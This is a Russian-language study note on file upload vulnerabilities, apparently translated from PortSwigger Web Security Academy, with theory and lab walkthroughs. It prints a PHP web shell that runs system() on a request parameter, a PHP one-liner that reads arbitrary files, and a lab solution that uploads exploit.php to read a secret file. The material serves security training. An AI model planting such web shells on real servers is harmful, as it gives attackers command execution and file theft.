
---

# Теория

![[Pasted image 20240624020213.png]]

---

### Что такое уязвимости загрузки файлов?  

**Уязвимости загрузки файлов** - это когда веб-сервер позволяет пользователям загружать файлы в свою файловую систему без достаточной проверки таких параметров, как их имя, тип, содержимое или размер. Невозможность должным образом обеспечить соблюдение этих ограничений может привести к тому, что даже базовая функция загрузки изображений может быть использована для загрузки произвольных и потенциально опасных файлов. Это могут быть даже файлы сценариев на стороне сервера, которые позволяют удаленно выполнять код.  
  
В некоторых случаях для нанесения ущерба достаточно самого факта загрузки файла. Другие атаки могут включать последующий HTTP-запрос файла, обычно для того, чтобы инициировать его выполнение на сервере.

---

### Каково влияние уязвимостей загрузки файлов?  

Влияние уязвимостей загрузки файлов обычно зависит от двух ключевых факторов:  
* Какой аспект файла веб-сайт не смог правильно проверить, будь то его размер, тип, содержимое и так далее.  
* Какие ограничения накладываются на файл после его успешной загрузки.  

В худшем случае тип файла не проверяется должным образом, и конфигурация сервера позволяет выполнять определенные типы файлов (например, .php и .jsp) в качестве кода. В этом случае злоумышленник может загрузить файл с кодом на стороне сервера, который функционирует как веб-оболочка, предоставляя полный контроль над сервером.  
  
Если имя файла не проверяется должным образом, это может позволить злоумышленнику перезаписать важные файлы, просто загрузив файл с таким же именем. Если сервер также уязвим для обхода каталогов, это может означать, что злоумышленники могут даже загружать файлы в непредусмотренные места.  
  
Если не убедиться в том, что размер файла не превышает ожидаемого порога, это может привести к атаке типа "отказ в обслуживании" (DoS), в результате которой злоумышленник заполняет все доступное дисковое пространство.

---

### Как возникают уязвимости при загрузке файлов?  
Учитывая довольно очевидную опасность, редко когда на веб-сайтах нет никаких ограничений на то, какие файлы разрешено загружать пользователям. Чаще всего разработчики внедряют надежную, по их мнению, проверку, которая либо изначально несовершенна, либо легко обходится.  
  
Например, они могут попытаться внести опасные типы файлов в черный список, но не учесть расхождения в парсинге при проверке расширений файлов. Как и в случае с любым другим черным списком, легко случайно пропустить более малоизвестные типы файлов, которые все равно могут быть опасными.  
  
В других случаях веб-сайт может пытаться проверить тип файла, проверяя свойства, которыми злоумышленник может легко манипулировать с помощью таких инструментов, как Burp Proxy или Repeater.  
  
В конечном итоге даже надежные меры проверки могут применяться непоследовательно в сети хостов и каталогов, образующих веб-сайт, что приведет к расхождениям, которые можно использовать в своих целях.

---

### Как веб-серверы обрабатывают запросы на статические файлы?  

Прежде чем мы рассмотрим, как использовать уязвимости загрузки файлов, важно иметь базовое представление о том, как серверы обрабатывают запросы на статические файлы.  
  
Исторически сложилось так, что веб-сайты почти полностью состояли из статических файлов, которые предоставлялись пользователям по запросу. В результате путь каждого запроса можно было сопоставить 1:1 с иерархией каталогов и файлов в файловой системе сервера. В настоящее время веб-сайты становятся все более динамичными, и путь запроса часто вообще не имеет прямого отношения к файловой системе. Тем не менее, веб-серверы все еще имеют дело с запросами на некоторые статические файлы, включая таблицы стилей, изображения и так далее.  
  
Процесс работы с этими статическими файлами во многом одинаков. В определенный момент сервер анализирует путь в запросе, чтобы определить расширение файла. Затем он использует его для определения типа запрашиваемого файла, обычно сравнивая его со списком предварительно настроенных соответствий между расширениями и типами MIME. Дальнейшие действия зависят от типа файла и конфигурации сервера.

- Если этот тип файла неисполняемый, например изображение или статическая HTML-страница, сервер может просто отправить содержимое файла клиенту в HTTP-ответе.
- Если тип файла исполняемый, например PHP-файл, **и** сервер настроен на выполнение файлов этого типа, он назначит переменные на основе заголовков и параметров в HTTP-запросе перед выполнением скрипта. Полученный результат может быть отправлен клиенту в HTTP-ответе.
- Если тип файла является исполняемым, но сервер не настроен на выполнение файлов такого типа, он обычно отвечает ошибкой. Однако в некоторых случаях содержимое файла может быть передано клиенту в виде обычного текста. Такие ошибки в конфигурации иногда могут использоваться для утечки исходного кода и другой конфиденциальной информации. [Пример](https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files) этого вы можете увидеть в [учебных материалах](https://portswigger.net/web-security/information-disclosure) по раскрытию информации.

<details>
    <summary style="cursor: pointer"><b>Tip</b></summary>
        Заголовок ответа <code>Content-Type</code> может дать подсказку о том, какой файл, по мнению сервера, он обслужил. Если этот заголовок не был явно установлен кодом приложения, он обычно содержит результат сопоставления расширения файла с типом MIME.
</details>

---

# Эксплуатация неограниченной загрузки файлов для развертывания Web shell-а

С точки зрения безопасности наихудший сценарий - это когда веб-сайт позволяет загружать серверные сценарии, такие как файлы PHP, Java или Python, а также настроен на их выполнение в виде кода. Это позволяет легко создать на сервере собственную веб-оболочку.

#### Web shell

Веб-оболочка - это вредоносный скрипт, который позволяет злоумышленнику выполнять произвольные команды на удаленном веб-сервере, просто отправляя HTTP-запросы на нужную конечную точку.

Если вам удастся успешно загрузить веб-оболочку, вы фактически получите полный контроль над сервером. Это означает, что вы можете читать и записывать произвольные файлы, передавать конфиденциальные данные и даже использовать сервер для атак как на внутреннюю инфраструктуру, так и на другие серверы вне сети. Например, следующая однострочная команда PHP может быть использована для чтения произвольных файлов из файловой системы сервера:

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

После загрузки запрос на этот вредоносный файл вернет в ответ содержимое целевого файла.

Более универсальная веб-оболочка может выглядеть примерно так:
```
<?php echo system($_GET['command']); ?>
```
Этот сценарий позволяет передать произвольную системную команду через параметр запроса следующим образом:
```
GET /example/exploit.php?command=id HTTP/1.1
```

### Удаленное выполнение кода через загрузку web shell-а

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

Эта лабораторная содержит уязвимую функцию загрузки изображений. Она не выполняет никакой проверки файлов, загружаемых пользователями, перед тем как сохранить их в файловой системе сервера.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP и используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, расположенной на баннере лаборатории.  
  
Вы можете войти в свою учетную запись, используя следующие учетные данные: `wiener:peter`

#### Решение

файл: `exploit.php`
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Далее нужно лишь обратиться к файлу:
```
GET /files/avatars/exploit.php HTTP/1.1
```

# Эксплуатация недостатков проверки загружаемых файлов  

Вряд ли вы найдете сайт, на котором нет защиты от атак на загрузку файлов, как мы видели в предыдущем примере. Но если защита существует, это еще не значит, что она надежна. Иногда все еще можно использовать недостатки в этих механизмах, чтобы получить веб-оболочку для удаленного выполнения кода.

## Неправильная проверка типа файла  

При отправке HTML-форм браузер обычно отправляет данные в `POST`-запросе с типом содержимого `application/x-www-form-url-encoded`. Это хорошо подходит для отправки простого текста, например вашего имени или адреса. Однако он не подходит для отправки больших объемов двоичных данных, например целого файла изображения или PDF-документа. В этом случае предпочтительнее использовать тип содержимого `multipart/form-data`.  
  
Рассмотрим форму, содержащую поля для загрузки изображения, его описания и ввода имени пользователя. При отправке такой формы может возникнуть запрос, который выглядит примерно так:
```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

Как видите, тело сообщения разделено на отдельные части для каждого из вводимых данных формы. Каждая часть содержит заголовок `Content-Disposition`, в котором содержится основная информация о поле ввода, к которому она относится. Эти отдельные части также могут содержать свой заголовок `Content-Type`, который сообщает серверу MIME-тип данных, отправленных с помощью этого ввода.  
  
Один из способов, с помощью которого веб-сайты могут пытаться проверить правильность загрузки файлов, - это проверка соответствия заголовка `Content-Type`, специфичного для поля ввода, ожидаемому типу MIME. Например, если сервер ожидает только файлы изображений, он может разрешить только такие типы, как `image/jpeg` и` image/png`. Проблемы могут возникнуть, если сервер неявно доверяет значению этого заголовка. Если не проводится дальнейшая проверка соответствия содержимого файла предполагаемому MIME-типу, эту защиту можно легко обойти с помощью таких инструментов, как Burp Repeater.

### Загрузка web shell-а через обход ограничений Content-Type
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
Эта лабораторная содержит уязвимую функцию загрузки изображений. Она пытается предотвратить загрузку пользователями файлов неожиданных типов, но для проверки этого полагается на проверку контролируемого пользователем ввода.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP и используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, указанной на баннере лаборатории.  
  
Вы можете войти в свой собственный аккаунт, используя следующие учетные данные: `wiener:peter`